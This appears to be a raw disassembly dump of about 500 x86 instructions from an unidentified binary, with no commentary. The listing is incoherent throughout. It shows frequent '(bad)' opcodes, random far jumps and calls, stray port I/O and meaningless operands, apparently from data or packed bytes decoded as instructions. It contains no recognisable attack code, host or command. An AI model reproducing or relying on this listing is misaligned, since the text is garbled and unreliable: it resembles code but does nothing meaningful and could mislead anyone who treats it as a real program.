  41e5c0:	fistp  WORD PTR [esi]
  41e5c2:	sahf   
  41e5c3:	push   esi
  41e5c4:	jmp    0x41e606
  41e5c6:	ret    
  41e5c7:	mov    esp,0xa98fe6b
  41e5cc:	(bad)  
  41e5cd:	retf   0x6593
  41e5d0:	scas   al,BYTE PTR es:[edi]
  41e5d1:	sub    DWORD PTR ss:[esi+0x4b4ac5a4],edx
  41e5d8:	inc    edx
  41e5d9:	stos   DWORD PTR es:[edi],eax
  41e5da:	into   
  41e5db:	dec    ecx
  41e5dc:	(bad)  [eax-0x3f]
  41e5df:	push   edx
  41e5e0:	push   ebx
  41e5e1:	adc    ebp,DWORD PTR [eax+0x14]
  41e5e4:	dec    ebx
  41e5e5:	adc    WORD PTR [ebx],ax
  41e5e8:	fidiv  WORD PTR [eax]
  41e5ea:	mov    edx,0x930fbbcd
  41e5ef:	or     bl,BYTE PTR [bx-0x79]
  41e5f3:	or     BYTE PTR [ecx],al
  41e5f5:	mov    bl,0x5f
  41e5f7:	fistp  DWORD PTR fs:[esi]
  41e5fa:	cmp    ecx,DWORD PTR [ebx]
  41e5fc:	xchg   ebx,eax
  41e5fd:	push   0x2a
  41e5ff:	mov    bh,BYTE PTR [edi+0x29]
  41e602:	mov    edx,0x8f4791fa
  41e607:	xchg   edx,eax
  41e608:	mov    esi,0x4b7a7272
  41e60d:	or     al,BYTE PTR ss:[ebp+ebp*8+0x37718539]
  41e615:	test   DWORD PTR [edi+0x7f],0xb3d589f3
  41e61c:	les    edi,FWORD PTR [ebp-0x5f839664]
  41e622:	xor    DWORD PTR ds:0x83a14a9a,eax
  41e628:	dec    eax
  41e629:	mov    eax,ss:0xc87fe790
  41e62f:	pop    esp
  41e630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e631:	and    eax,ecx
  41e633:	jae    0x41e5c5
  41e635:	mov    WORD PTR [edx],?
  41e637:	and    eax,0xa02a320d
  41e63c:	aam    0x5a
  41e63e:	push   0x9667b1b0
  41e643:	aam    0x72
  41e645:	inc    ebx
  41e646:	push   ebp
  41e647:	sbb    DWORD PTR ss:[ebp-0x25],esi
  41e64b:	and    cl,0x80
  41e64e:	dec    ecx
  41e64f:	fisttp WORD PTR [edi+0x5fe7afcd]
  41e655:	mov    esi,0x703f4ecd
  41e65a:	push   esi
  41e65b:	retf   
  41e65c:	sub    BYTE PTR [edx+0x43],ah
  41e65f:	in     eax,0xe8
  41e661:	mov    ebp,0xdb5178e0
  41e666:	or     bh,bh
  41e668:	ins    DWORD PTR es:[edi],dx
  41e669:	mov    ah,0xea
  41e66b:	or     eax,0xa019f3e7
  41e670:	add    DWORD PTR [ebx],ecx
  41e672:	mov    esi,DWORD PTR [esp+edx*8]
  41e675:	mov    bh,0x65
  41e677:	xor    ecx,DWORD PTR [ebx+0x3d]
  41e67a:	push   ebx
  41e67b:	lds    ecx,FWORD PTR [edi-0x7]
  41e67e:	inc    ebx
  41e67f:	mov    ah,0xa5
  41e681:	in     eax,dx
  41e682:	test   eax,0x4d2157ac
  41e687:	mov    WORD PTR [ebp+0x1],?
  41e68a:	loope  0x41e6c7
  41e68c:	sbb    ah,bl
  41e68e:	push   es
  41e68f:	mov    esi,0x48cbb819
  41e694:	std    
  41e695:	sbb    edx,DWORD PTR [edx-0x3b]
  41e698:	mov    BYTE PTR [ecx+0x5b2568e7],0xb4
  41e69f:	or     eax,esp
  41e6a1:	pusha  
  41e6a2:	popa   
  41e6a3:	pop    eax
  41e6a4:	pop    ebx
  41e6a5:	fcom   QWORD PTR [eax+0x729dc0ea]
  41e6ab:	ret    
  41e6ac:	mov    bh,0x79
  41e6ae:	sbb    bh,BYTE PTR [ebp+0x31]
  41e6b1:	fild   WORD PTR [edx]
  41e6b3:	out    0xb6,eax
  41e6b5:	mov    edx,fs
  41e6b7:	cmp    bh,BYTE PTR [esi-0x30]
  41e6ba:	sbb    dh,BYTE PTR [ecx+0x70]
  41e6bd:	jp     0x41e641
  41e6bf:	sub    dh,bh
  41e6c1:	jl     0x41e66e
  41e6c3:	xor    al,0xd
  41e6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c6:	shr    al,0x0
  41e6c9:	push   ecx
  41e6ca:	(bad)  
  41e6cb:	repnz popf 
  41e6cd:	push   eax
  41e6ce:	mov    ds:0x5d67acd2,eax
  41e6d3:	mov    ebp,0x5a208504
  41e6d8:	xor    eax,0xeae55fd4
  41e6dd:	dec    edx
  41e6de:	fdivr  DWORD PTR [ebx+0x32]
  41e6e1:	int    0xa4
  41e6e3:	in     eax,dx
  41e6e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e5:	xchg   edx,eax
  41e6e6:	ror    bl,0x64
  41e6e9:	push   ecx
  41e6ea:	in     eax,dx
  41e6eb:	popa   
  41e6ec:	push   ebx
  41e6ed:	int    0x90
  41e6ef:	sbb    al,0x30
  41e6f1:	stos   DWORD PTR es:[edi],eax
  41e6f2:	leave  
  41e6f3:	push   edx
  41e6f4:	cmp    edi,DWORD PTR [ebx+0x5e]
  41e6f7:	outs   dx,DWORD PTR ds:[esi]
  41e6f8:	pop    ss
  41e6f9:	jp     0x41e6a9
  41e6fb:	jge    0x41e769
  41e6fd:	cmp    BYTE PTR [ecx],dl
  41e6ff:	inc    esp
  41e700:	inc    eax
  41e701:	sbb    eax,0x594eb3a1
  41e706:	or     eax,edi
  41e708:	dec    edx
  41e709:	push   edx
  41e70a:	dec    ecx
  41e70b:	or     al,0x37
  41e70d:	mov    WORD PTR [ecx+0x76],fs
  41e710:	ret    0x4cd
  41e713:	sbb    DWORD PTR [eax],edx
  41e715:	(bad)  
  41e716:	xchg   ecx,eax
  41e717:	cmp    ch,cl
  41e719:	ficomp DWORD PTR [eax]
  41e71b:	sbb    ah,ch
  41e71d:	sub    dh,BYTE PTR [ebx]
  41e71f:	and    esp,DWORD PTR [ecx+0x6]
  41e722:	cmp    al,0x8b
  41e724:	jle    0x41e766
  41e726:	jge    0x41e7a7
  41e728:	lock loop 0x41e6ae
  41e72b:	adc    al,0x3b
  41e72d:	or     eax,0x44b230c0
  41e732:	lea    eax,[eax-0x4d5994cf]
  41e738:	or     BYTE PTR [ecx+0x72aa1e6c],al
  41e73e:	push   esi
  41e73f:	data16 rcr BYTE PTR [ecx-0x5e],0xf4
  41e744:	ins    DWORD PTR es:[edi],dx
  41e745:	stos   DWORD PTR es:[edi],eax
  41e746:	xchg   ecx,eax
  41e747:	(bad)  
  41e748:	adc    edi,DWORD PTR [eax]
  41e74a:	or     eax,0x3c48914e
  41e74f:	(bad)  
  41e750:	ja     0x41e736
  41e752:	push   ebx
  41e753:	lea    ebp,[edi-0x1128dc3d]
  41e759:	mov    dl,0x32
  41e75b:	push   edx
  41e75c:	push   edx
  41e75d:	push   es
  41e75e:	arpl   WORD PTR [edx],sp
  41e760:	mov    bh,0xe5
  41e762:	iret   
  41e763:	outs   dx,DWORD PTR ds:[esi]
  41e764:	fucomi st,st(6)
  41e766:	adc    BYTE PTR [ecx-0x6c],ah
  41e769:	(bad)  
  41e76a:	mov    ebx,0x49cba72
  41e76f:	cs mov ecx,0xc0c7ed08
  41e775:	pop    ecx
  41e776:	dec    esi
  41e777:	dec    esp
  41e778:	sti    
  41e779:	mov    al,0x24
  41e77b:	sbb    al,0xd8
  41e77d:	xor    DWORD PTR [esi],ebx
  41e77f:	inc    edi
  41e780:	retf   0x7abd
  41e783:	shr    DWORD PTR [edx],cl
  41e785:	add    eax,0xffffff98
  41e788:	cld    
  41e789:	retf   0xb97c
  41e78c:	cli    
  41e78d:	pusha  
  41e78e:	pop    ss
  41e78f:	call   0x1a1dcfc2
  41e794:	es ret 0x38a2
  41e798:	outs   dx,BYTE PTR ds:[esi]
  41e799:	icebp  
  41e79a:	popa   
  41e79b:	aad    0xf5
  41e79d:	cmc    
  41e79e:	imul   ebx,DWORD PTR [ebx-0x3d5753bb],0x6e43b47
  41e7a8:	div    BYTE PTR [edx]
  41e7aa:	sub    ah,BYTE PTR [edx+eiz*4-0x72b91b40]
  41e7b1:	add    DWORD PTR [edx+0x6b4891e7],esp
  41e7b7:	popf   
  41e7b8:	or     BYTE PTR ds:0x77ef9dd7,bl
  41e7be:	(bad)  
  41e7bf:	jnp    0x41e76a
  41e7c1:	xchg   edi,eax
  41e7c2:	es es test esi,eax
  41e7c6:	into   
  41e7c7:	aad    0x4
  41e7c9:	pop    esp
  41e7ca:	retf   
  41e7cb:	mov    bl,0xdc
  41e7cd:	das    
  41e7ce:	or     ecx,DWORD PTR [esi+0x7d]
  41e7d1:	or     al,0x9c
  41e7d3:	push   esp
  41e7d4:	mov    dh,0x4d
  41e7d6:	push   edx
  41e7d7:	cmp    al,0xdf
  41e7d9:	mov    ds:0xafff3a84,eax
  41e7de:	jmp    0x41e84e
  41e7e0:	inc    BYTE PTR [edx]
  41e7e2:	repnz jmp 0xd899:0x7c4794ec
  41e7ea:	sar    dl,cl
  41e7ec:	int    0x80
  41e7ee:	mov    al,0x83
  41e7f0:	call   0x13c0:0x738e1a72
  41e7f7:	ja     0x41e813
  41e7f9:	mov    ecx,0x8d3d77c7
  41e7fe:	ins    DWORD PTR es:[edi],dx
  41e7ff:	mov    esp,0xf752abfb
  41e804:	lods   al,BYTE PTR ds:[esi]
  41e805:	cmp    DWORD PTR [ebx],esp
  41e807:	sub    al,0xe5
  41e809:	inc    ecx
  41e80a:	out    0xe6,al
  41e80c:	mov    al,ds:0x9353a86f
  41e811:	sub    eax,0x2e3a732
  41e816:	adc    dh,BYTE PTR [edi+0x1287b444]
  41e81c:	mov    gs,esp
  41e81e:	lods   al,BYTE PTR ds:[esi]
  41e81f:	cmp    BYTE PTR [ebp+0x31],dl
  41e822:	or     al,0x47
  41e824:	inc    esi
  41e825:	or     bl,al
  41e827:	bound  edx,QWORD PTR [esi]
  41e829:	neg    BYTE PTR [edx+0x75]
  41e82c:	enter  0x4bec,0x41
  41e830:	xor    DWORD PTR [esi],ebp
  41e832:	mov    bl,0x93
  41e834:	bound  eax,QWORD PTR [ecx]
  41e836:	cmp    eax,0x3a318988
  41e83b:	cmc    
  41e83c:	jg     0x41e82a
  41e83e:	dec    edx
  41e83f:	cld    
  41e840:	mov    cl,0x97
  41e842:	dec    ebp
  41e843:	sub    esi,0xffffff8c
  41e846:	add    esp,DWORD PTR [ebx]
  41e848:	popf   
  41e849:	test   BYTE PTR [edx-0xe1d7a63],bh
  41e84f:	or     dl,BYTE PTR [edx-0x5f6ec99e]
  41e855:	inc    edi
  41e856:	lahf   
  41e857:	loop   0x41e8b5
  41e859:	pusha  
  41e85a:	or     dl,BYTE PTR [ebx+0x23c55da2]
  41e860:	xlat   BYTE PTR ds:[ebx]
  41e861:	mov    ecx,0xcf9f0fb6
  41e866:	add    ch,BYTE PTR [eax+edx*8]
  41e869:	std    
  41e86a:	lahf   
  41e86b:	nop
  41e86c:	mov    eax,cs:0xf00ef7d9
  41e872:	dec    edi
  41e873:	in     al,dx
  41e874:	scas   eax,DWORD PTR es:[edi]
  41e875:	mov    WORD PTR [edi+ecx*4+0x56495f92],ss
  41e87c:	mov    ds:0x6c79e103,al
  41e881:	xchg   ecx,eax
  41e883:	push   edi
  41e884:	sbb    edi,DWORD PTR [ecx-0x3e]
  41e887:	int    0x62
  41e889:	mov    dl,0xf7
  41e88b:	mov    cl,0x31
  41e88d:	dec    edx
  41e88e:	rcl    BYTE PTR [ebx],0x51
  41e891:	jbe    0x41e89d
  41e893:	std    
  41e894:	jbe    0x41e8d2
  41e896:	xchg   esp,eax
  41e897:	cmp    DWORD PTR [ebx],ebx
  41e899:	xor    eax,0x195435a2
  41e89e:	pop    ecx
  41e89f:	lahf   
  41e8a0:	jns    0x41e882
  41e8a2:	xor    al,0x3c
  41e8a4:	mov    WORD PTR [ecx-0x227e2dcc],fs
  41e8aa:	and    BYTE PTR [edx-0x2d0f2c62],dl
  41e8b0:	lahf   
  41e8b1:	xchg   BYTE PTR [esp+eax*1+0x5e57db0b],ah
  41e8b8:	fwait
  41e8b9:	or     al,BYTE PTR [edi-0x258303f6]
  41e8bf:	popa   
  41e8c0:	aad    0x75
  41e8c2:	jne    0x41e8ad
  41e8c4:	mov    bh,0xf
  41e8c6:	mov    ebx,0xca349086
  41e8cb:	xchg   edx,eax
  41e8cc:	and    al,0x11
  41e8ce:	mov    ah,0xae
  41e8d0:	popf   
  41e8d1:	add    bl,BYTE PTR [ebx-0x6db953eb]
  41e8d7:	fdivrp st(7),st
  41e8d9:	mov    esi,0x4038080d
  41e8de:	xchg   BYTE PTR [ecx-0x5f],bl
  41e8e1:	xor    DWORD PTR [edi-0x8c5f32f],ebx
  41e8e7:	push   edx
  41e8e8:	in     al,dx
  41e8e9:	into   
  41e8ea:	pop    ebp
  41e8eb:	test   BYTE PTR [edi+0x3d06b77e],ch
  41e8f1:	ret    0xd66b
  41e8f4:	ins    DWORD PTR es:[edi],dx
  41e8f5:	or     al,0x8
  41e8f7:	mov    edi,0x9cfa7924
  41e8fc:	mov    ah,BYTE PTR [esi+0x664676a2]
  41e902:	cmc    
  41e903:	sbb    dl,BYTE PTR [esi+0x7d3311a0]
  41e909:	call   DWORD PTR [ebx+0x17c4b62d]
  41e90f:	fimul  WORD PTR [ecx+0x7fef8eea]
  41e915:	add    eax,0xd48ea042
  41e91a:	out    0x7a,eax
  41e91c:	add    ebp,esi
  41e91e:	and    bh,ch
  41e920:	dec    edx
  41e921:	in     al,0xa
  41e923:	loop   0x41e8b4
  41e925:	(bad)  
  41e927:	mov    BYTE PTR [ecx-0x7acc7663],0x58
  41e92e:	mov    ah,0x22
  41e930:	push   ds
  41e931:	jmp    FWORD PTR [edi-0x3b8d179d]
  41e937:	inc    eax
  41e938:	cli    
  41e939:	pushf  
  41e93a:	je     0x41e991
  41e93c:	add    eax,0x11ffa1e0
  41e941:	clc    
  41e942:	outs   dx,BYTE PTR ds:[esi]
  41e943:	xor    al,0xa
  41e945:	mov    dh,0x93
  41e947:	aaa    
  41e948:	lahf   
  41e949:	sub    BYTE PTR [esp+eax*1-0x497fc743],ah
  41e950:	jae    0x41e8ee
  41e952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e953:	bound  edx,QWORD PTR [ebx]
  41e955:	mov    eax,ds:0xc97d589b
  41e95a:	mov    ch,0xb1
  41e95c:	adc    edx,DWORD PTR [edx]
  41e95e:	lods   eax,DWORD PTR gs:[esi]
  41e960:	dec    esi
  41e961:	div    esp
  41e963:	push   esp
  41e964:	mov    ecx,edx
  41e966:	mov    eax,0xa5f4c61c
  41e96b:	jae    0x41e94c
  41e96d:	adc    dl,dl
  41e96f:	xchg   ebx,eax
  41e970:	pop    ebp
  41e971:	xchg   edi,eax
  41e972:	repz xor DWORD PTR [ebp+0x56],esp
  41e976:	repz mov ds:0x5fe6a226,al
  41e97c:	scas   eax,DWORD PTR es:[edi]
  41e97d:	xchg   ebx,eax
  41e97e:	gs fwait
  41e980:	xchg   edi,eax
  41e981:	js     0x41e9c5
  41e983:	imul   BYTE PTR [ecx+0x48]
  41e986:	nop
  41e987:	sahf   
  41e988:	lods   al,BYTE PTR ds:[esi]
  41e989:	leave  
  41e98a:	retf   
  41e98b:	adc    BYTE PTR [ebx],dl
  41e98d:	xor    BYTE PTR [edi+edx*2],dl
  41e990:	loopne 0x41ea0b
  41e992:	out    dx,al
  41e993:	cmp    BYTE PTR [ebx+0x7f],al
  41e996:	fimul  WORD PTR [edx-0x72]
  41e999:	pusha  
  41e99a:	add    esi,DWORD PTR [ecx-0x29]
  41e99d:	xor    BYTE PTR [edx+0xfe0caf1],0x2f
  41e9a4:	jbe    0x41e9c0
  41e9a6:	inc    eax
  41e9a7:	sbb    ch,BYTE PTR ds:0x595ab231
  41e9ad:	out    0xda,eax
  41e9af:	ds sub al,0xad
  41e9b2:	ds call 0x4beb:0xe69c02aa
  41e9ba:	xchg   esp,ebp
  41e9bc:	in     eax,dx
  41e9bd:	mov    bl,0x85
  41e9bf:	gs daa 
  41e9c1:	sub    DWORD PTR [esi-0x45c27d57],esi
  41e9c7:	mov    ?,WORD PTR [esi]
  41e9c9:	rol    DWORD PTR [esi],0xe7
  41e9cc:	rcl    DWORD PTR [edx+eax*2-0x1b],0x1a
  41e9d1:	cli    
  41e9d2:	out    0xea,al
  41e9d4:	aas    
  41e9d5:	mov    dh,0x38
  41e9d7:	loop   0x41e9af
  41e9d9:	dec    esi
  41e9da:	(bad)  
  41e9db:	in     eax,dx
  41e9dc:	and    eax,0xc2ab0cf9
  41e9e1:	not    BYTE PTR [edx-0x59678863]
  41e9e7:	adc    DWORD PTR [edi+0x54],0xffffffc0
  41e9eb:	sbb    esp,ebx
  41e9ed:	arpl   WORD PTR [edi+0x52],sp
  41e9f0:	mov    edi,0xf84cc5e0
  41e9f5:	jo     0x41ea0e
  41e9f7:	lds    ecx,FWORD PTR [esi+0x209be70f]
  41e9fd:	(bad)  
  41e9fe:	xchg   ebx,eax
  41e9ff:	ja     0x41ea37
  41ea01:	dec    edi
  41ea02:	jo     0x41ea36
  41ea04:	test   al,0x95
  41ea06:	cmp    BYTE PTR [eax+0x34b6c4c6],cl
  41ea0c:	(bad)  
  41ea0d:	loope  0x41ea68
  41ea0f:	mov    eax,es:0xb890aff5
  41ea15:	mov    al,0x15
  41ea17:	inc    ecx
  41ea18:	or     al,0x73
  41ea1a:	sub    bh,BYTE PTR [eax+eax*2+0x3f]
  41ea1e:	xor    eax,0x45bedcb7
  41ea23:	out    0x0,eax
  41ea25:	aam    0x5d
  41ea27:	dec    edi
  41ea28:	test   ah,dh
  41ea2a:	clc    
  41ea2b:	out    0x73,al
  41ea2d:	push   ebp
  41ea2e:	xor    DWORD PTR [edi],esi
  41ea30:	or     DWORD PTR ds:0x40708b9b,ebx
  41ea36:	in     eax,0xe9
  41ea38:	jns    0x41ea04
  41ea3a:	dec    esi
  41ea3b:	jp     0x41e9ca
  41ea3d:	push   esi
  41ea3e:	scas   eax,DWORD PTR es:[edi]
  41ea3f:	pop    eax
  41ea40:	and    DWORD PTR [ecx],0x133fdeb7
  41ea46:	inc    ecx
  41ea47:	dec    edi
  41ea48:	mov    esp,0xa5c80c2b
  41ea4d:	cs sbb al,0x5f
  41ea50:	mov    ds,ebp
  41ea52:	mov    esi,0x7d89eecf
  41ea57:	xor    esp,esp
  41ea59:	ins    DWORD PTR es:[edi],dx
  41ea5a:	cmp    edx,DWORD PTR [edi-0x43570814]
  41ea60:	adc    BYTE PTR [eax],dl
  41ea62:	xor    esi,esi
  41ea64:	sahf   
  41ea65:	je     0x41ea77
  41ea67:	mov    dl,bl
  41ea69:	sub    BYTE PTR [esi],bh
  41ea6b:	sbb    al,0xcf
  41ea6d:	shr    DWORD PTR [edi-0x48],1
  41ea70:	cmp    ch,ah
  41ea72:	mov    bl,0x42
  41ea74:	push   ebx
  41ea75:	pop    ecx
  41ea76:	sahf   
  41ea77:	mov    bh,0x46
  41ea79:	cmp    eax,0x41eb94c
  41ea7e:	jnp    0x41ea78
  41ea80:	out    0xf2,eax
  41ea82:	push   esi
  41ea83:	jle    0x41eac1
  41ea85:	test   DWORD PTR [ecx+0x4515713d],eax
  41ea8b:	out    dx,eax
  41ea8c:	mov    esi,0x529081c9
  41ea91:	adc    bh,0x8c
  41ea94:	or     DWORD PTR [ebx-0x7b],ecx
  41ea97:	mov    ds:0x34652cfd,al
  41ea9c:	adc    BYTE PTR [esi+0x22],dh
  41ea9f:	xchg   ebp,eax
  41eaa0:	cmp    al,0x8b
  41eaa2:	daa    
  41eaa3:	test   DWORD PTR [edx+eiz*4+0x1],ebp
  41eaa7:	in     al,dx
  41eaa8:	inc    eax
  41eaa9:	imul   ecx,DWORD PTR [ecx+0xa075fec],0x3eedb4ce
  41eab3:	sbb    cl,al
  41eab5:	int3   
  41eab6:	mov    ds:0xca7f7b07,al
  41eabb:	dec    esp
  41eabc:	rol    BYTE PTR [esi+edi*2-0x58e9dea0],0xfb
  41eac4:	test   esi,eax
  41eac6:	xchg   DWORD PTR [edi],ebp
  41eac8:	jecxz  0x41eaca
  41eaca:	mov    ebx,DWORD PTR [ebx-0x56]
  41eacd:	fistp  DWORD PTR [ecx]
  41eacf:	jge    0x41eb2c
  41ead1:	mov    al,0x57
  41ead3:	jg     0x41eb4a
  41ead5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ead6:	jl     0x41eb16
  41ead8:	inc    esi
  41ead9:	sub    eax,ebp
  41eadb:	dec    eax
  41eadc:	or     DWORD PTR [ebp+0x5e],ecx
  41eadf:	fs push 0x2da58890
  41eae5:	push   ds
  41eae6:	add    bl,BYTE PTR ds:0xede7fac4
  41eaec:	xchg   ecx,eax
  41eaed:	xor    al,0x3c
  41eaef:	and    eax,0x3883f20f
  41eaf4:	lahf   
  41eaf5:	fs pop edi
  41eaf7:	pop    esp
  41eaf8:	add    al,0xf
  41eafa:	add    eax,0x5008a91b
  41eaff:	mov    dl,0xf0
  41eb01:	push   cs
  41eb02:	daa    
  41eb03:	jmp    FWORD PTR [edx-0x5cd9c9a9]
  41eb09:	loopne 0x41eab2
  41eb0b:	fs mov ebx,0xe71f8c8b
  41eb11:	xchg   edx,eax
  41eb12:	shr    DWORD PTR [ebp+0x4ee9d92d],0x15
  41eb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb1a:	fs (bad) 
  41eb1c:	push   ebp
  41eb1d:	mov    ds:0xa71df800,eax
  41eb22:	jo     0x41eab8
  41eb24:	inc    edi
  41eb25:	cmp    eax,0x2db769f1
  41eb2a:	sahf   
  41eb2b:	mov    ah,cl
  41eb2d:	ret    
  41eb2e:	and    DWORD PTR [edx-0x68],edi
  41eb31:	add    BYTE PTR [edx],al
  41eb33:	add    edi,DWORD PTR [edi]
  41eb35:	or     BYTE PTR [edi],bl
  41eb37:	mov    ecx,edx
  41eb39:	dec    esi
  41eb3a:	imul   ebx,DWORD PTR [ebp-0x70a7198b],0xffffffc3
  41eb41:	mov    edi,0x85ac35cf
  41eb46:	jae    0x41eb3e
  41eb48:	adc    esp,DWORD PTR [eax+0x7f]
  41eb4b:	sbb    esp,DWORD PTR es:[ecx-0x18]
  41eb4f:	jne    0x41eb64
  41eb51:	stc    
  41eb52:	(bad)  
  41eb53:	and    al,0x14
  41eb55:	xchg   ebp,eax
  41eb56:	jb     0x41eb34
  41eb58:	test   esi,0x9b41b449
  41eb5e:	xlat   BYTE PTR ds:[ebx]
  41eb5f:	mov    ebp,0x655516
  41eb64:	jle    0x41eb8d
  41eb66:	pop    edx
  41eb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb68:	in     eax,dx
  41eb69:	mov    cl,0xd8
  41eb6b:	sbb    esi,esi
  41eb6d:	or     al,0x23
  41eb6f:	sub    ah,BYTE PTR [esi+0x2e69c415]
  41eb75:	xlat   BYTE PTR ds:[ebx]
  41eb76:	dec    esi
  41eb77:	test   BYTE PTR [edx+eax*8-0x78],0x90
  41eb7c:	mov    al,bl
  41eb7e:	pop    esi
  41eb7f:	dec    ecx
  41eb80:	dec    eax
  41eb81:	push   edi
  41eb82:	aad    0xef
  41eb84:	bound  edx,QWORD PTR [ecx+0x28]
  41eb87:	pop    eax
  41eb88:	(bad)  
  41eb89:	imul   ebp,DWORD PTR [esi+edi*8],0x8
  41eb8d:	pop    eax
  41eb8e:	xor    DWORD PTR [ecx-0x6c],0xffffffa3
  41eb92:	mul    ebp
  41eb94:	cmc    
  41eb95:	xor    esi,ebp
  41eb97:	stos   DWORD PTR es:[edi],eax
  41eb98:	inc    edx
  41eb99:	in     eax,dx
  41eb9a:	aad    0x2f
  41eb9c:	mov    ch,0x94
  41eb9e:	(bad)  
  41eb9f:	xor    eax,0xfb5ba2eb
  41eba4:	pop    ebp
  41eba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba6:	inc    ebx
  41eba7:	in     eax,0x6d
  41eba9:	aam    0x7f
  41ebab:	repz sub eax,0x9c5e12d8
  41ebb1:	mov    al,0xe7
  41ebb3:	(bad)  
  41ebb5:	int3   
  41ebb6:	push   0x6f9a86ce
  41ebbb:	or     eax,0x8b17629
  41ebc0:	pop    ebp
  41ebc1:	xor    al,0x71
  41ebc3:	sub    DWORD PTR [edi],esp
  41ebc5:	(bad)  
  41ebc6:	int    0x9d
  41ebc8:	xchg   edi,eax
  41ebc9:	jno    0x41ec2e
  41ebcb:	loop   0x41eb9d
  41ebcd:	inc    ecx
  41ebce:	pusha  
  41ebcf:	dec    eax
  41ebd0:	ja     0x41eba4
  41ebd2:	scas   eax,DWORD PTR es:[edi]
  41ebd3:	add    dl,al
  41ebd5:	mov    WORD PTR [edx+0x79ef7a13],ds
  41ebdb:	hlt    
  41ebdc:	loope  0x41eb97
  41ebde:	push   esi
  41ebdf:	pop    ebx
  41ebe0:	push   ds
  41ebe1:	das    
  41ebe2:	xor    ch,BYTE PTR [ebp-0x7ece4ff1]
  41ebe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebe9:	fmul   DWORD PTR ss:[edi]
  41ebec:	fisttp DWORD PTR [edx-0x43ffbd88]
  41ebf2:	pop    edi
  41ebf3:	sbb    eax,0x6ff0adb0
  41ebf8:	pop    edx
  41ebf9:	stc    
  41ebfa:	js     0x41ec29
  41ebfc:	add    BYTE PTR [edx+ebx*8+0x4fe9b1e4],al
  41ec03:	std    
  41ec04:	mov    DWORD PTR [edx-0x3a3fb969],esi
  41ec0a:	adc    DWORD PTR [ebx],0xffffff8c
  41ec0d:	add    al,dl
  41ec0f:	xchg   ebp,eax
  41ec10:	mov    esi,0x7aa132d2
  41ec15:	into   
  41ec16:	inc    esi
  41ec17:	xchg   DWORD PTR [ebx],edx
  41ec19:	loop   0x41ebb5
  41ec1b:	popa   
  41ec1c:	ds repz cdq 
  41ec1f:	xor    al,0x49
  41ec21:	mov    ds:0x54d2c55b,al
  41ec26:	push   eax
  41ec27:	stc    
  41ec28:	xchg   edi,ebx
  41ec2a:	mov    ds:0xab5b4450,al
  41ec2f:	mov    ds,esp
  41ec31:	cmp    ah,BYTE PTR [eax-0x6138579d]
  41ec37:	cmp    BYTE PTR [ebp+0x690abca7],al
  41ec3d:	fs ins BYTE PTR es:[edi],dx
  41ec3f:	imul   esi,DWORD PTR [edx-0x23],0xffffffc7
  41ec43:	jmp    0x41ec86
  41ec45:	lds    esp,FWORD PTR [eax+0x12341abe]
  41ec4b:	not    DWORD PTR ds:0x54fa12fe
  41ec51:	aam    0x9
  41ec53:	mov    al,ds:0x8bb65604
  41ec58:	pop    esp
  41ec59:	enter  0x520a,0x35
  41ec5d:	push   ecx
  41ec5e:	cmc    
  41ec5f:	clc    
  41ec60:	inc    esi
  41ec61:	fnstenv [edx]
  41ec63:	mov    ecx,0x57b854eb
  41ec68:	sub    DWORD PTR [esi-0x5e3c5fdc],ebp
  41ec6e:	popf   
  41ec6f:	loopne 0x41ec73
  41ec71:	mov    esp,0x2563f415
  41ec76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec77:	hlt    
  41ec78:	sub    BYTE PTR [ecx],cl
  41ec7a:	jo     0x41ec0a
  41ec7c:	inc    ebx
  41ec7d:	sub    esi,esp
  41ec7f:	arpl   WORD PTR [eax+ebx*1+0xe9eef0e],sp
  41ec86:	in     eax,0xb9
  41ec88:	call   0x57b6:0xfa1777d7
  41ec8f:	jg     0x41ec4e
  41ec91:	push   ebx
  41ec92:	dec    eax
  41ec93:	mov    esp,0xa56a318f
  41ec98:	iret   
  41ec99:	int3   
  41ec9a:	outs   dx,BYTE PTR ds:[esi]
  41ec9b:	or     eax,0xde593918
  41eca0:	ficomp WORD PTR [eax-0x1def890d]
  41eca6:	es ret 
  41eca8:	inc    BYTE PTR [eax-0x61]
  41ecab:	mov    eax,0xd58c60a8
  41ecb0:	ret    
  41ecb1:	mov    bl,0xb6
  41ecb3:	fs aad 0x3e
  41ecb6:	ret    0x8d74
  41ecb9:	xchg   ebx,eax
  41ecba:	jns    0x41ec8b
  41ecbc:	pop    ds
  41ecbd:	push   ebx
  41ecbe:	cdq    
  41ecbf:	fsubr  QWORD PTR [edi+0x76]
  41ecc2:	out    0xcf,eax
  41ecc4:	lahf   
  41ecc5:	shr    BYTE PTR [ebp-0x2b],cl
  41ecc8:	stos   DWORD PTR es:[edi],eax
  41ecc9:	bound  esi,QWORD PTR [ecx]
  41eccb:	adc    DWORD PTR [edx],edi
  41eccd:	in     eax,0x5a
  41eccf:	fnsave [ebp+0x4f]
  41ecd2:	pmuludq mm4,QWORD PTR [ecx-0x28]
  41ecd6:	shl    DWORD PTR [esi+ecx*4],cl
  41ecd9:	(bad)  
  41ecda:	jecxz  0x41ecf5
  41ecdc:	into   
  41ecdd:	xchg   ebx,eax
  41ecde:	inc    edx
  41ecdf:	mov    bl,0xc2
  41ece1:	test   al,0x3f
  41ece3:	xchg   ebp,eax
  41ece4:	pop    ds
  41ece5:	(bad)  
  41ece6:	fadd   DWORD PTR [ecx+esi*4-0x69d3d20c]
  41eced:	mov    ds:0xc5a8b852,eax
  41ecf2:	inc    esi
  41ecf3:	iret   
  41ecf4:	add    BYTE PTR [esi],al
  41ecf6:	fst    QWORD PTR [esi-0x30]
  41ecf9:	sbb    BYTE PTR [edx+0x25],bl
  41ecfc:	add    ah,bl
  41ecfe:	jno    0x41ed20
  41ed00:	push   0xb77eb881
  41ed05:	stos   DWORD PTR es:[edi],eax
  41ed06:	repz xor BYTE PTR [esi+edx*1-0x20],al
  41ed0b:	rcl    edi,cl
  41ed0d:	in     al,0xf6
  41ed0f:	xor    DWORD PTR [esi-0x2b22f714],0xb521062f
